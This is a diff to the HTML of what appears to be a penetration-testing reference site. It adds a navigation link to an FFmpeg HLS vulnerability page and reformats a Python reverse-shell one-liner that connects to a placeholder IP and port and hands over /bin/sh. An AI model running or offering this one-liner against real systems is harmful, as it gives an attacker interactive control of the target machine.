@@ -179,6 +179,10 @@
                     
     <a class="section-link" href="../cve/CVE-2019-19781/">CVE-2019-19781</a>
                 </li>
+                <li class="">
+                    
+    <a class="section-link" href="../cve/ffmpeg/">FFmpeg HLS vulnerability</a>
+                </li>
     </ul>
           </li>
           
@@ -275,7 +279,7 @@ reinitialize the terminal with <code>reset</code>.</p>
 </code></pre>
 
 <h3 id="python">Python</h3>
-<pre><code class="language-bash">python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\&quot;{IP}\\&quot;,{Port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\&quot;/bin/sh\\&quot;,\\&quot;-i\\&quot;]);\'
+<pre><code class="language-bash">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;{IP}&quot;,{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
 </code></pre>
 
 <h3 id="bash">Bash</h3>
